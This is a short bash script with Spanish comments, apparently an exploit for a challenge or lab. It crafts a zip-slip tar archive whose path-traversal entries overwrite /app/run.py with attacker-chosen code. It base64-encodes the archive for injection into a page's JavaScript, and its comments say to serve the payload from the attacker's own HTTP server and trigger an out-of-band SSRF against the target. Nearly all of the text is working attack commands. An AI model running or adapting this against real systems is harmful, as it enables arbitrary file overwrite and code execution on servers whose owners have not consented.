#!/bin/bash

# El contenido de run.py es aquel que se ejecutara ojo asi que modificalo como tu desees :)
tar -czvf zip-slip.tar.gz --transform 's|^|../../../../../../../../../../../../../../|' /app/run.py

# Con esto tendras el string en b64 del fichero que estara luego en el javascript en index.html
cat zip-slip.tar.gz| base64 -w 0; echo

# Y por ultimo levantar el server tuyo: python3 -m http.server 8000
# Luego hacer el SSRF OOB apuntando a tu server y listo ;)
